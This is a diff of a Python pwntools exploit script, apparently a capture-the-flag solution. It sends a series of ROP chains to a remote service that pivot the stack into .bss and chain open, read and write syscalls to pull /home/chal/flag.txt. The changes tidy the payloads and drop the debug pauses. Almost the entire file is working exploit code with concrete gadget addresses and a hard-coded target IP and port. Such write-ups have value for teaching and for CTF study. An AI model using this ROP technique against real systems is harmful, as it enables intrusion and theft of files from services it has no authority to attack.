@@ -1,7 +1,9 @@
 from pwn import *
+from time import sleep
 
 context.arch = "amd64"
 context.terminal = ["tmux", "splitw", "-h"]
+
 # 0000000000401cd5 <main>:
 # 0x0000000000448d27 : pop rax ; ret
 # 0x0000000000401832 : pop rdi ; ret
@@ -24,7 +26,6 @@ buf = bss1 - 0x820
 
 def main():
     r = remote("10.113.184.121", 10054)
-    # r = remote("localhost", 10054)
     # r = process("./share/chal")
     # attach(
     #     r,
@@ -34,137 +35,70 @@ def main():
     # )
 
     payload = flat(
-        [
-            0,
-            0,
-            0,
-            0,
-            bss1,  # rbp
-            0x0000000000401CD5 + 12,  # <main+12>
-        ]
+        {
+            0x20: [
+                bss1,  # rbp
+                0x0000000000401CD5 + 12,  # <main+12>
+            ]
+        }
     )
-    input()
-    print(payload)
+    # print(payload)
     r.sendline(payload)
+    sleep(0.1)
 
     payload = flat(
         [
-            u64(b"/home/ch"),  # bss-0x20
-            u64(b"al/flag."),
-            u64(b"txt".ljust(8, b"\x00")),
-            0,
-            #
+            [b"/home/chal/flag.txt".ljust(0x20, b"\x00")],
             bss2,  # rbp # bss
             # open
-            0x0000000000448D27,  # pop rax ; ret
-            2,  # open
-            0x0000000000401832,  # pop rdi ; ret
-            bss1 - 0x20,  # file
-            0x000000000040F01E,  # pop rsi ; ret
-            0x0000000000000000,  # flag
-            0x000000000040173F,  # pop rdx ; ret
-            0x0000000000000000,  # flag
+            [0x0000000000448D27, 2],  # pop rax ; ret  # open
+            [0x0000000000401832, bss1 - 0x20],  # pop rdi ; ret  # file
+            [0x000000000040F01E, 0x0000000000000000],  # pop rsi ; ret  # flag
+            [0x000000000040173F, 0x0000000000000000],  # pop rdx ; ret  # flag
             0x0000000000448280,  # syscall ; *** ; ret
             0x0000000000401CD5 + 12,  # ra <main+12>
         ]
     )
-    input()
-    print(payload)
+    # print(payload)
     r.sendline(payload)
+    sleep(0.1)
 
     payload = flat(
         [
-            0,
-            0,
-            0,
-            0,
+            [0, 0, 0, 0],
             bss1,  # rbp
             # read
-            0x0000000000448D27,  # pop rax ; ret
-            0,  # read
-            0x0000000000401832,  # pop rdi ; ret
-            3,  # fd
-            0x000000000040F01E,  # pop rsi ; ret
-            buf,  # buf
-            0x000000000040173F,  # pop rdx ; ret
-            0x100,  # size
+            [0x0000000000448D27, 0],  # pop rax ; ret  # read
+            [0x0000000000401832, 3],  # pop rdi ; ret  # fd
+            [0x000000000040F01E, buf],  # pop rsi ; ret  # buf
+            [0x000000000040173F, 0x100],  # pop rdx ; ret  # size
             0x0000000000448280,  # syscall ; *** ; ret
             0x0000000000401CD5 + 12,  # <main+12>
         ]
     )
-    input()
-    print(payload)
+    # print(payload)
     r.sendline(payload)
+    sleep(0.1)
 
     payload = flat(
         [
-            0,
-            0,
-            0,
-            0,
+            [0, 0, 0, 0],
             bss2,  # rbp
             # write
-            0x0000000000448D27,  # pop rax ; ret
-            1,  # write
-            0x0000000000401832,  # pop rdi ; ret
-            1,  # fd
-            0x000000000040F01E,  # pop rsi ; ret
-            buf,  # buf
-            0x000000000040173F,  # pop rdx ; ret
-            0x100,  # size
+            [0x0000000000448D27, 1],  # pop rax ; ret  # write
+            [0x0000000000401832, 1],  # pop rdi ; ret  # fd
+            [0x000000000040F01E, buf],  # pop rsi ; ret  # buf
+            [0x000000000040173F, 0x100],  # pop rdx ; ret  # size
             0x0000000000448280,  # syscall ; *** ; ret
             0x0000000000401CD5 + 12,  # <main+12>
+            0,
         ]
     )
-    input()
-    print(payload)
+    # print(payload)
     r.sendline(payload)
-
-    r.interactive()
-    return
-    # rbp = bss+0x80
-    payload = flat(
-        [
-            0x0000000000000000,  # read # bss+0x60
-            0x0000000000401832,  # pop rdi ; ret
-            3,  # fd
-            0x000000000040F01B,  # pop r13 ; pop r14 ; ret # bss+0x80
-            bss + 0x100,  # rbp # bss+0x88
-            0x0000000000401CD5 + 12,  # ra <main+12> # bss+0x90
-            0x000000000040F01E,  # pop rsi ; ret # bss+0x78
-            buf,  # buf
-            0x000000000040173F,  # pop rdx ; ret
-            0x100,  # size
-            0x00000000004012D3,  # syscall
-            # write
-            0x0000000000448D27,  # pop rax ; ret
-            1,  # write
-            0x0000000000401832,  # pop rdi ; ret
-            1,  # fd # bss+0xd0
-            0x000000000040F01E,  # pop rsi ; ret # bss+0xd8
-        ]
-    )
-    input()
-    print(payload)
-    r.sendline(payload)
-
-    # rbp = bss+0x100
-    payload = flat(
-        [
-            buf,  # buf # bss+0xe0
-            0x000000000040173F,  # pop rdx ; ret # bss+0xe8
-            0x100,  # size # bss+0xf0
-            0x000000000040F01B,  # pop r13 ; pop r14 ; ret # bss+0xf8
-            0x00000000004012D3,  # syscall # bss+0x100
-            bss,  # bss+0x108
-            0x0000000000401CD5 + 12,  # ra <main+12>  # bss+0x110
-        ]
-    )
-    input()
-    print(payload)
-    r.sendline(payload)
-
-    r.interactive()
+    sleep(0.1)
+    ret = r.recvline()
+    print(ret.decode().strip())
 
 
 if __name__ == "__main__":
